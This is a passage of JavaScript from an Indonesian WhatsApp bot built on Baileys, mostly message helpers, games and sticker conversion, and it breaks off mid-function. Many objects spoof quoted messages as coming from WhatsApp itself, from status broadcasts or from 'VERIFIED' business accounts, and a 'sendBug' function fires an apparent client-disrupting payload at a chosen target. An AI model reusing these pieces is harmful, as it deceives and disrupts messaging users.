            const sotoy2 = ['🍊 : 🍒 : 🍐','🍒 : 🔔 : 🍊','🍊 : 🍋 : 🔔','🔔 : 🍒 : 🍐','🔔 : 🍒 : 🍊','🍊 : 🍋 : 🔔',		'🍐 : 🍒 : 🍋','🍊 : 🍒 : 🍒','🔔 : 🔔 : 🍇','🍌 : 🍒 : 🔔','🍐 : 🔔 : 🔔','🍊 : 🍋 : 🍒','🍋 : 🍋 : 🍌','🔔 : 🔔 : 🍇','🔔 : 🍐 : 🍇']
            const sotoy1 = ['🍊 : 🍒 : 🍐','🍒 : 🔔 : 🍊','🍊 : 🍋 : 🔔','🔔 : 🍒 : 🍐','🔔 : 🍒 : 🍊','🍊 : 🍋 : 🔔',		'🍐 : 🍒 : 🍋','🍊 : 🍒 : 🍒','?? : 🔔 : 🍇','🍌 : 🍒 : 🔔','🍐 : 🔔 : 🔔','🍊 : 🍋 : 🍒','🍋 : 🍋 : 🍌','🔔 : 🔔 : 🍇','🔔 : 🍐 : 🍇']
            const sotoy3 = ['🔔 : 🔔 : 🔔','🍒 : 🍒 : 🍒','🍌 : 🍌 : 🍌']
            const buruh1 = ['🐳','🦈','🐬','🐋','🐟','🐠','🦐','🦑','🦀','🐚']
            const buruh2 = ['🐔','🦃','🐿','🐐','🐏','🐖','🐑','🐎','🐺','🦩']
            const buruh3 = ['🦋','🕷','🐝','🐉','🦆','🦅','🕊','🐧','🐦','🦇']
            const buruh11 = buruh1[Math.floor(Math.random() * (buruh1.length))]
		    const buruh22 = buruh2[Math.floor(Math.random() * (buruh2.length))]
		    const buruh33 = buruh3[Math.floor(Math.random() * (buruh3.length))]
    const isUrl = (url) => {
      return url.match(
        new RegExp(
          /https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/,
          "gi"
        )
      );
    };
  const reply = (teks) => {
      ronove.sendMessage(from, teks, text, { quoted: mek });
    };
    const balas = (teks) => {
      ronove.sendMessage(from, teks, text, { quoted: fdoc });
    };
    const sendMess = (hehe, teks) => {
      ronove.sendMessage(hehe, teks, text);
    };
//>>>>>>>>STICKER<<<<<<<\\
		const sticOwner = (hehe) => {
			ano = fs.readFileSync('./stiker/anime/owner.webp')
			ronove.sendMessage(hehe, ano, sticker, { quoted: mek})
		}
		const sticNotAdmin = (hehe) => {
			ano = fs.readFileSync('./stiker/anime/notadmin.webp')
			ronove.sendMessage(hehe, ano, sticker, { quoted: mek})
		}
		const sticAdmin = (hehe) => {
			ano = fs.readFileSync('./stiker/anime/admin.webp')
			ronove.sendMessage(hehe, ano, sticker, { quoted: mek})
		}
		const sticWait = (hehe) => {
			ano = fs.readFileSync('./stiker/anime/wait.webp')
			ronove.sendMessage(hehe, ano, sticker, { quoted: bentarsu })
		}
		const sticOk = (hehe) => {
			ano = fs.readFileSync('./stiker/anime/ok.webp')
			ronove.sendMessage(hehe, ano, sticker, { quoted: mek})
		}
    const mentions = (teks, memberr, id) => {
      id == null || id == undefined || id == false
        ? ronove.sendMessage(from, teks.trim(), extendedText, {
            contextInfo: { mentionedJid: memberr },
          })
        : ronove.sendMessage(from, teks.trim(), extendedText, {
            quoted: mek,
            contextInfo: { mentionedJid: memberr },
          });
    };
// l Bang:)
    const ftroli = {
      key: {
        fromMe: false,
        participant: "6285347683869@s.whatsapp.net",
        remoteJid: "6286347683869-6286347683869@g.us",
      },
      message: {
        orderMessage: {
          itemCount: 10,
          status: 200,
          thumbnail: iye,
          surface: 200,
          message: iye,
          orderTitle: "ronove.",
          sellerJid: "6286347683869@s.whatsapp.net",
        },
      },
      contextInfo: { forwardingScore: 999, isForwarded: true },
      sendEphemeral: true,
    };
const fgif7 = { key: { fromMe: false, participant: `6286347683869@s.whatsapp.net`, ...(from ? { remoteJid: '6286347683869@s.whatsapp.net' } : {}) }, message: { "productMessage":{"product": {"productImage": {"mimetype":'image/jpeg',"jpegThumbnail": iye, "title": `${ucapanWaktu} ${pushname}`, "productImageCount": 1 }, "businessOwnerJid": `6281545463585@s.whatsapp.net` }}}
}
 const fkontak = { 
                  key: {fromMe: false,participant: `6286347683869@s.whatsapp.net`, ...(from ? { remoteJid: `6286347683869@s.whatsapp.net` } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}
            //FAKE STICKER
            const fsticker = {
                  key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},"message": {"stickerMessage": { "url": "https://mmg.whatsapp.net/d/f/Am6FBfNf-E2f1VoGBXkPaNAy7L6Tw_HMavKrHEt48QM4.enc","fileSha256": "Yfj8SW7liSEnDakvyVlXVZQ1LJBC9idn09X7KHe8HTc=","fileEncSha256": "F854aUrzgAkBTOVULpne4oSIi6S04Jo56pjZEo+p+9U=","mediaKey": "Z3nA2asclAAwWHngNO/vJ81qxOE2/0gkEnXak+NxPV4=","mimetype": "image/webp","height": 64,"width": 64,"directPath": "/v/t62.15575-24/12097272_1193895144391295_8973688483514349023_n.enc?ccb=11-4&oh=5a9d7147627a8355569f1a641b9ebee3&oe=60C65E73","fileLength": "7186","mediaKeyTimestamp": "1622815545","isAnimated": false}}}
            //FAKE VN
const ftrol = {
	key : {
                          participant : '0@s.whatsapp.net'
                        },
       message: {
                    orderMessage: {
                            itemCount : 999999999,
                            status: 1,
                            surface : 1,
                            message: `${ucapanWaktu} ${pushname}`, //Kasih namalu
                            orderTitle: `${ucapanWaktu} ${pushname}`,
                            thumbnail: iye, //Gambarnye
                            sellerJid: '6286347683869@s.whatsapp.net' 
                          }
                        }
                      }
const ftri = {
	key : {
                          participant : '6286347683869@s.whatsapp.net'
                        },
       message: {
                    orderMessage: {
                            itemCount : 999999999,
                            status: 1,
                            surface : 1,
                            message: `${namabot} VERIFIED`, //Kasih namalu
                            orderTitle: `${namabot} VERIFIED`,
                            thumbnail: iye, //Gambarnye
                            sellerJid: '0@s.whatsapp.net' 
                          }
                        }
                      }
const ftroli2 = {
	key : {
                          participant : '0@s.whatsapp.net'
                        },
       message: {
                    orderMessage: {
                            itemCount : 123,
                            status: 1,
                            surface : 1,
                            message: `${ucapanWaktu} ${pushname}`, //Kasih namalu
                            orderTitle: `${ucapanWaktu} ${pushname}`,
                            thumbnail: fake, //Gambarnye
                            sellerJid: '0@s.whatsapp.net' 
                          }
                        }
                      }
const finv = {
	"key": {
		"fromMe": false,
		"participant": "0@s.whatsapp.net",
		"remoteJid": "0@s.whatsapp.net"
	},
	"message": {
		"groupInviteMessage": {
			"groupJid": "6286347683869-6286347683869@g.us",
			"inviteCode": `${ucapanWaktu} ${pushname}`,
			"groupName": `${ucapanWaktu} ${pushname}`, 
            "caption": `${ucapanWaktu} ${pushname}`, 
            'jpegThumbnail': fake
		}
	}
}
    const freply = {
      key: { participant: `0@s.whatsapp.net`,
        ...(from ? { remoteJid: "6286347683869-6286347683869@g.us" } : {}),
      },
      message: { documentMessage: { title: fake, jpegThumbnail: thumb } },
    };
    const fdoc = {
      key: { participant: `0@s.whatsapp.net`,
        ...(from ? { remoteJid: "6286347683869-6286347683869@g.us" } : {}),
      },
      message: { documentMessage: { title: fake, jpegThumbnail: thumb } },
    };
const fview = {
      key: { participant: "0@s.whatsapp.net" },
      message: { viewOnceMessage: { title: fake, jpegThumbnail: thumb } },
    };
    const fvn = {
      key: {
        participant: `0@s.whatsapp.net`,
        ...(from ? { remoteJid: "6286347683869-6286347683869@g.us" } : {}),
      },
      message: {
        audioMessage: {
          mimetype: "audio/ogg; codecs=opus",
          seconds: 999999,
          ptt: "true",
        },
      },
    };
        const fg3 = {
      key: {
        participant: `0@s.whatsapp.net`,
        ...(from ? { remoteJid: "6286347683869-6286347683869@g.us" } : {}),
      },
      message: {
        videoMessage: {
          title: autongevn,
          h: `Hmm`,
          seconds: "99999",
          gifPlayback: "true",
          caption: autongevn,
          jpegThumbnail: thumb,
        },
      },
    };
            const nikak = {
      key: { participant: `0@s.whatsapp.net`,
        ...(from ? { remoteJid: "6286347683869-6286347683869@g.us" } : {}),
      },
      message: { documentMessage: { title: 'Nih kak' , jpegThumbnail: thumb } },
    };
    const fgif = {
      key: {
        participant: `0@s.whatsapp.net`,
        ...(from ? { remoteJid: "6285347683869-6285347683869@g.us" } : {}),
      },
      message: {
        videoMessage: {
          title: fake,
          h: `Hmm`,
          seconds: "99999",
          gifPlayback: "true",
          caption: fake,
          jpegThumbnail: thumb,
        },
      },
    };
    const bentarsu = {
      key: {
        participant: `0@s.whatsapp.net`,
        ...(from ? { remoteJid: "6285347683869-6285347683869@g.us" } : {}),
      },
      message: {
        videoMessage: {
          title: fake,
          h: `Hmm`,
          seconds: "99999",
          gifPlayback: "true",
          caption: bentar,
          jpegThumbnail: thumb,
        },
      },
    };
const fstick = {
"key": {
	  "participant": `0@s.whatsapp.net`,
      "remoteJid": "6285347683869-6285347683869@g.us",
      "fromMe": false,
      "id": "3B64558B07848BD81108C1D14712018E"
    },
    "message": {
      "stickerMessage": {
        "fileSha256": "5b017c6ac1fb953c7bd21034d2fca5fad75ef2da4c3b2c2877ef49fa544e74bf",
		"pngThumbnail": iye,
	 "mimetype": "image/webp",
        "height": 64,
        "width": 64,
        "directPath": "/v/t62.15575-24/56110107_763365384384977_5720135628188301198_n.enc?oh=450f8f684b06f0ba2dbc9779e5f06774&oe=605B81EE",
        "fileLength": "0418",
        "firstFrameLength": 3626,
        "isAnimated": false
      }
    },
    "messageTimestamp": "1614070775",
    "status": "PENDING"
  }
// STICKER

    const fgclink = {
      key: { participant: "0@s.whatsapp.net", remoteJid: "0@s.whatsapp.net" },
      message: {
        groupInviteMessage: {
          groupJid: "6288213840883-1616169743@g.us",
          inviteCode: "m",
          groupName: "P",
          caption: fake,
          jpegThumbnail: thumb,
        },
      },
    };
const fvid = {
	 key: { 
          fromMe: false,
	      participant: `0@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "6285347683869-6285347683869@g.us" } : {}) 
                },
	 message: { 
                 "videoMessage": { 
                 "title": `${ucapanWaktu} ${pushname}`,
                 "h": `${ucapanWaktu} ${pushname}`,
                 'duration': '99999', 
                 'caption': `${ucapanWaktu} ${pushname}`,
                 'jpegThumbnail': iye
                        }
                       }
	                  }
const ftex = {
	 key: { 
          fromMe: false,
	      participant: `0@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "6285347683869-6285347683869@g.us" } : {}) 
                },
	 message: { 
		"extendedTextMessage": {
                 "text": `${ucapanWaktu} ${pushname}`,
                 "title": `${ucapanWaktu} ${pushname}`,
                 'jpegThumbnail': iye
                        }
	                  } 
                     }
    const floc = {
      key: { participant: "0@s.whatsapp.net" },
      message: { locationMessage: { name: fake, jpegThumbnail: thumb } },
    };
    const fakestatus = (teks) => {
      ronove.sendMessage(from, teks, text, {
        quoted: {
          key: {
            fromMe: false,
            participant: `0@s.whatsapp.net`,
            ...(from ? { remoteJid: "status@broadcast" } : {}),
          },
          message: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
              mimetype: "image/jpeg",
              caption: fake,
              fileSha256: "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
              fileLength: "28777",
              height: 1080,
              width: 1079,
              mediaKey: "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
              fileEncSha256: "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
              directPath:
                "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
              mediaKeyTimestamp: "1610993486",
              jpegThumbnail: fs.readFileSync("./stik/thumb.jpeg"),
              scansSidecar:
                "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw==",
            },
          },
        },
      });
    };
    const fakethumb = (teks, yes) => {
      ronove.sendMessage(from, teks, image, {
        thumbnail: fs.readFileSync("./stik/fake.jpeg"),
        quoted: mek,
        caption: yes,
      });
    };
    const fakegroup = (teks) => {
      ronove.sendMessage(from, teks, text, {
        quoted: {
          key: {
            fromMe: false,
            participant: `0@s.whatsapp.net`,
            ...(from ? { remoteJid: "6289523258649-1604595598@g.us" } : {}),
          },
          message: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
              mimetype: "image/jpeg",
              caption: fake,
              fileSha256: "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
              fileLength: "28777",
              height: 1080,
              width: 1079,
              mediaKey: "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
              fileEncSha256: "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
              directPath:
                "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
              mediaKeyTimestamp: "1610993486",
              jpegThumbnail: fs.readFileSync("./stik/thumb.jpeg"),
              scansSidecar:
                "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw==",
            },
          },
        },
      });
    };
    const sendStickerFromUrl = async (to, url) => {
      var names = Date.now() / 10000;
      var download = function (uri, filename, callback) {
        request.head(uri, function (err, res, body) {
          request(uri)
            .pipe(fs.createWriteStream(filename))
            .on("close", callback);
        });
      };
ronove.on('CB:action,,battery', json => {
		global.batteryLevelStr = json[2][0][1].value
	   global.batterylevel = parseInt(batteryLevelStr)
		baterai = batterylevel
        if (json[2][0][1].live == 'true') charging = true
       if (json[2][0][1].live == 'false') charging = false
        console.log(json[2][0][1])
		console.log('Baterai : ' + batterylevel+'%')
	})
	global.batrei = global.batrei ? global.batrei : []
		ronove.on('CB:action,,battery', json => {
		const batteryLevelStr = json[2][0][1].value
		const batterylevel = parseInt(batteryLevelStr)
		global.batrei.push(batterylevel)
		}) 
download(url, "./stik" + names + ".png", async function () {
        console.log("selesai");
        let filess = "./stik" + names + ".png";
        let asw = "./stik" + names + ".webp";
        exec(
          `ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`,
          (err) => {
            let media = fs.readFileSync(asw);
            ronove.sendMessage(to, media, MessageType.sticker, { quoted: mek });
            fs.unlinkSync(filess);
            fs.unlinkSync(asw);
          }
        );
      });
    };
if (budy.toLowerCase() === `8473`){
		if (isRegister) return 
		    register.push(sender)
		    fs.writeFileSync('./database/user/registered.json', JSON.stringify(register))
		    teks = `Verification success\n\nPlease send *!menu* to view menu`
		    ronove.sendMessage(from, teks, text, {quoted: fdoc })
}          /*if (!mek.key.fromMe && banChats === false) return*/
	              
	const sendStickerUrl = async(to, url) => {
			console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Downloading sticker...'))
				var names = getRandom('.webp')
				var namea = getRandom('.png')
				var download = function (uri, filename, callback) {
					request.head(uri, function (err, res, body) {
						request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
					});
				};
				download(url, namea, async function () {
					let filess = namea
					let asw = names
					require('./lib/exif.js')
					exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
					exec(`webpmux -set exif ./src/sticker/data.exif ${asw} -o ${asw}`, async (error) => {
					let media = fs.readFileSync(asw)
					ronove.sendMessage(to, media, sticker)
					console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Succes send sticker...'))
					});
					});
				});
			}
      const sendWebp = async(to, url) => {
           var names = Date.now() / 10000;
           var download = function (uri, filename, callback) {
           request.head(uri, function (err, res, body) {
           request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
});
};
           download(url, './stiker' + names + '.png', async function () {
           console.log('selesai');
           let filess = './stiker' + names + '.png'
           let asw = './stiker' + names + '.webp'
           exec(`ffmpeg -i ${filess} -vf "scale=512:512:force_original_aspect_ratio=increase,fps=40, crop=512:512" ${asw}`, (err) => {
           fs.unlinkSync(filess)
           if (err) return reply(`${err}`)
           exec(`webpmux -set exif ./stiker/data.exif ${asw} -o ${asw}`, async (error) => {
           if (error) return reply(`${error}`)
           ronove.sendMessage(from, fs.readFileSync(asw), sticker, {sendEphemeral:true, quoted:mek})
           fs.unlinkSync(asw)
});
});
});
}
           
const getRegisteredRandomId = () => {
            return _registered[Math.floor(Math.random() * _registered.length)].id
        }
        const addRegisteredUser = (userid, sender, age, time, serials) => {
            const obj = { id: userid, name: sender, age: age, time: time, serial: serials }
            _registered.push(obj)
            fs.writeFileSync('./database/user/registered.json', JSON.stringify(_registered))
        }
        
   
//******************* 》banchat《 ********************\\
if (isBanchat){
if (!itsMe && !isOwner)return 
}
    const ftokoo = {
      key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(from ? { remoteJid: "628534768369@s.whatsapp.net" } : {}),
      },
      message: {
        productMessage: {
          product: {
            productImage: {
              mimetype: "image/jpeg",
              jpegThumbnail: fs.readFileSync(`./stik/thumb.jpeg`), //Gambarnye
            },
            title: "FakeReply Bang", //Kasih namalu
            description: "KIRANA BOTS",
            currencyCode: "USD",
            priceAmount1000: "2000",
            retailerId: `${namaowner}`,
            productImageCount: 1,
          },
          businessOwnerJid: `0@s.whatsapp.net`,
        },
      },
    };
 const ftok = {
key: {
			fromMe: false,
			participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "628534768369@s.whatsapp.net" } : {})
		},
		message: {
			"productMessage": {
				"product": {
					"productImage":{
						"mimetype": "image/jpeg",
						"jpegThumbnail": iye //Gambarnye
					},
					"title": `${ucapanWaktu} ${pushname}`, //Kasih namalu 
					"description": `${ucapanWaktu} ${pushname}`, 
					"currencyCode": "USD",
					"priceAmount1000": "2000",
					"retailerId": `${ucapanWaktu} ${pushname}`,
					"productImageCount": 1
				},
				    "businessOwnerJid": `0@s.whatsapp.net`
		}
	}
}
    const sendMediaURL = async (to, url, text = "", mids = []) => {
      if (mids.length > 0) {
        text = normalizeMention(to, text, mids);
      }
      const fn = Date.now() / 10000;
      const filename = fn.toString();
      let mime = "";
      var download = function (uri, filename, callback) {
        request.head(uri, function (err, res, body) {
          mime = res.headers["content-type"];
          request(uri)
            .pipe(fs.createWriteStream(filename))
            .on("close", callback);
        });
      };
      download(url, filename, async function () {
        console.log("done");
        let media = fs.readFileSync(filename);
        let type = mime.split("/")[0] + "Message";
        if (mime === "image/gif") {
          type = MessageType.video;
          mime = Mimetype.gif;
        }
        if (mime.split("/")[0] === "audio") {
          mime = Mimetype.mp4Audio;
        }
        ronove.sendMessage(to, media, type, {
          quoted: mek,
          mimetype: mime,
          caption: text,
          contextInfo: { mentionedJid: mids },
        });

        fs.unlinkSync(filename);
      });
    };
const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
const isQuotedReply = type === 'extendedTextMessage' && content.includes('Message')
///Button Text

const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
const buttonMessage = {
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 1
}
ronove.sendMessage(id, buttonMessage, MessageType.buttonsMessage, options)
}
///Button Image
const sendButImage = async(id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await ronove.prepareMessage(from, kma, image)
const buttonMessages = {
imageMessage: mhan.message.imageMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 4
}
ronove.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
///Button Video
const sendButVideo = async(id, text1, desc1, vid1, but = [], options = {}) => {
kma = vid1
mhan = await ronove.prepareMessage(from, kma, video)
const buttonMessages = {
videoMessage: mhan.message.videoMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 5
}
ronove.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
        // Sewa
             _sewa.expiredCheck(ronove, sewa)
///Button Location
const sendButLocation = async (id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await ronove.prepareMessage(from, kma, location)
const buttonMessages = {
locationMessage: mhan.message.locationMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 6
}
ronove.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
    const kick = function (from, orangnya) {
      for (let i of orangnya) {
        ronove.groupRemove(from, [i]);
      }
    };
    const add = function (from, orangnya) {
      ronove.groupAdd(from, orangnya);
    };
    const nihkak = (teks) => {
        	grup = ronove.prepareMessageFromContent(from, { "groupInviteMessage": { "groupJid": '628534768369-628534768369@g.us', "inviteCode": 'https://chat.whatsapp.com/H0Ohj3LWxz8FkIxiHDCCgW', "groupName": `Nih kak`, "footerText": "FORUM KIRANA", "jpegThumbnail": iye, "caption": teks}}, {quoted:mek})
            ronove.relayWAMessage(grup)
        }
        const grupinv = (teks) => {
        	grup = ronove.prepareMessageFromContent(from, { "groupInviteMessage": { "groupJid": '628534768369-628534768369@g.us', "inviteCode": 'https://chat.whatsapp.com/H0Ohj3LWxz8FkIxiHDCCgW', "groupName": `KIRANA BOTS`, "footerText": "FORUM KIRANA", "jpegThumbnail": iye, "caption": teks}}, {quoted:mek})
            ronove.relayWAMessage(grup)
        }
const fakeitem = (teks) => {
            ronove.sendMessage(from, teks, text, {
                quoted: {
        key:{
        	fromMe:false,
        participant:`0@s.whatsapp.net`, ...(from ? {
remoteJid :"6285347683869-6285347683869@g.us" }: {})
                    },message:{"orderMessage":{"orderId":"174238614569481","thumbnail":fs.readFileSync(`./stik/thumb.jpeg`),"itemCount":10,"status":"INQUIRY","surface":"CATALOG","message":`${namaowner}`,"token":"AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="}}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true})}
const katalog = (teks) => {
             res = ronove.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 111119999, "message": teks, "footerText": `*${namaowner}*`, "thumbnail": bgg, "surface": 'CATALOG' }}, {quoted:ftrol})
             ronove.relayWAMessage(res)
        }
const fakewa = (teks) => {        
ronove.sendMessage(from, teks, text, { thumbnail: fake, sendEphemeral: true, quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: `${jam} - ${week} ${weton} - ${date}`,body:"",previewType:"PHOTO",thumbnail:iye,sourceUrl:`https://wa.me/6281545463585?text=Assalamualaikum`}}})
		}
const replyfakelink = (teks) => {
ronove.sendMessage(from, teks, text,{contextInfo :{text: 'hi',
"forwardingScore": 1000000000,
isForwarded: false,
sendEphemeral: false,
"externalAdReply": {
                "title": `${namabot}/n VERIFIED`,
                "body": "",
                "previewType": "PHOTO",
                "thumbnailUrl": "https://a.top4top.io/p_2073icief0.jpg",
                "thumbnail": fake,
                "sourceUrl": ``
},mentionedJid:[sender]}, quoted : fgif})
};
const replywa = (teks) => {
ronove.sendMessage(from, teks, text,{contextInfo :{text: 'hi',
"forwardingScore": 1000000000,
isForwarded: false,
sendEphemeral: false,
"externalAdReply": {
                "title": `Whatsapp`,
                "body": `wa.me/6285347683869`,
                "mediaType": "10",
                "mediaUrl": `wa.me/6285347683869`,
                "thumbnailUrl": "https://j.top4top.io/p_20682m4yj0.jpg",
                "thumbnail": iye,
                "sourceUrl": `wa.me/6285347683869`,
},mentionedJid:[sender]}, quoted : mek})
};
const fakeyt = (teks) => {
ronove.sendMessage(from, teks, text,{contextInfo :{text: 'hi',
"forwardingScore": 1000000000,
isForwarded: false,
sendEphemeral: false,
"externalAdReply": {
"title": `hallo ${pushname}` ,
"body": `${ucapanWaktu}`,
"mediaType": "2",
"thumbnailUrl": "https://i.postimg.cc/Vvqj0tY3/ronove.jpg",
"mediaUrl": "https://youtu.be/JcCPeJTMuO4",
"thumbnail": fs.readFileSync('./stik/thumb.jpeg'),
"sourceUrl": "",
},mentionedJid:[sender]}, quoted : fgif})
};
// Support Di Versi 3.5.2 
    const sendBug = async (target, teks) => {
      if (!teks) teks = ".";
      await ronove.relayWAMessage(
        ronove.prepareMessageFromContent(
          target,
          ronove.prepareDisappearingMessageSettingContent(0),
          {}
        ),
        { waitForAck: true }
      );
      ronove.sendMessage(target, teks, "conversation");
    };

    //FUNCTION
    function clockString(ms) {
      let h = isNaN(ms) ? "--" : Math.floor(ms / 3600000);
      let m = isNaN(ms) ? "--" : Math.floor(ms / 60000) % 60;
      let s = isNaN(ms) ? "--" : Math.floor(ms / 1000) % 60;
      return [h, m, s].map((v) => v.toString().padStart(2, 0)).join(":");
    }

    cekafk(afk);
    if (!mek.key.remoteJid.endsWith("@g.us") && offline) {
      if (!mek.key.fromMe) {
        if (isAfk(mek.key.remoteJid)) return;
        addafk(mek.key.remoteJid);
        heheh = ms(Date.now() - waktu);
        ronove.sendMessage(
          mek.key.remoteJid,
          `@${owner} Sedang Offline!\n\n*Alasan :* ${alasan}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`,
          MessageType.text,
          {
            contextInfo: {
              mentionedJid: [`${owner}@s.whatsapp.net`],
              stanzaId: "B826873620DD5947E683E3ABE663F263",
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: {
                imageMessage: {
                  caption: "*OFFLINE*",
                  jpegThumbnail: fs.readFileSync("./stik/thumb.jpeg"),
                },
              },
            },
          }
        );
      }
    }
    if (mek.key.remoteJid.endsWith("@g.us") && offline) {
      if (!mek.key.fromMe) {
        if (mek.message.extendedTextMessage != undefined) {
          if (mek.message.extendedTextMessage.contextInfo != undefined) {
            if (
              mek.message.extendedTextMessage.contextInfo.mentionedJid !=
              undefined
            ) {
              for (let ment of mek.message.extendedTextMessage.contextInfo
                .mentionedJid) {
                if (ment === `${owner}@s.whatsapp.net`) {
                  if (isAfk(mek.key.remoteJid)) return;
                  addafk(mek.key.remoteJid);
                  heheh = ms(Date.now() - waktu);
                  ronove.sendMessage(
                    mek.key.remoteJid,
                    `@${owner} Sedang Offline!\n\n *Alasan :* ${alasan}\n *Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`,
                    MessageType.text,
                    {
                      contextInfo: {
                        mentionedJid: [`${owner}@s.whatsapp.net`],
                        stanzaId: "B826873620DD5947E683E3ABE663F263",
                        participant: "0@s.whatsapp.net",
                        remoteJid: "status@broadcast",
                        quotedMessage: {
                          imageMessage: {
                            caption: "*OFFLINE*",
                            jpegThumbnail: fs.readFileSync("./stik/thumb.jpeg"),
                          },
                        },
                      },
                    }
                  );
                }
              }
            }
          }
        }
      }
    }

    //========================================================================================================================//
    colors = ["red", "white", "black", "blue", "yellow", "green"];
    const isMedia = type === "imageMessage" || type === "videoMessage";
    const isQuotedImage =
      type === "extendedTextMessage" && content.includes("imageMessage");
    const isQuotedVideo =
      type === "extendedTextMessage" && content.includes("videoMessage");
    const isQuotedAudio =
      type === "extendedTextMessage" && content.includes("audioMessage");
    const isQuotedSticker =
      type === "extendedTextMessage" && content.includes("stickerMessage");

/*if (listbut) console.log("[",color("command","lime"),"]",time2,color(listbut,"lime"),"from",color(sender.split("@")[0],"cyan"))*/
//list command

async function sendFileFromUrl(from, url, caption, msg, men) {
            let mime = '';
            let res = await axios.head(url)
            mime = res.headers['content-type']
            let type = mime.split("/")[0]+"Message"
            if(mime === "image/gif"){
                type = MessageType.video
                mime = Mimetype.gif
            }
            if(mime === "application/pdf"){
                type = MessageType.document
                mime = Mimetype.pdf
            }
            if(mime.split("/")[0] === "audio"){
                mime = Mimetype.mp4Audio
            }
            return ronove.sendMessage(from, await getBuffer(url), type, {caption: caption, quoted: mek, mimetype: mime, contextInfo: {"mentionedJid": men ? men : []}})
        }
    if (!isGroup && prefix && command)
      console.log(
        "\x1b[1;31m~\x1b[1;37m>",
        "[\x1b[1;32mEXEC\x1b[1;37m]",
        time,
        color(command),
        "from",
        color(sender.split("@")[0]),
        "args :",
        color(args.length)
      );
    //if (!isGroup && !isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
    if (prefix && command && isGroup)
      console.log(
        "\x1b[1;31m~\x1b[1;37m>",
        "[\x1b[1;32mEXEC\x1b[1;37m]",
        time,
        color(command),
        "from",
        color(sender.split("@")[0]),
        "in",
        color(groupName),
        "args :",
        color(args.length)
      );
    //if (!isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
 
    if (isGroup && !isVote) {
      if (budy.toLowerCase() === "vote") {
        let vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`));
        let _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`));
        let fil = vote.map((v) => v.participant);
        let id_vote = sender ? sender : "6281545463585@s.whatsapp.net";
        if (fil.includes(id_vote)) {
          return mentions(
            "@" + sender.split("@")[0] + " Anda sudah vote",
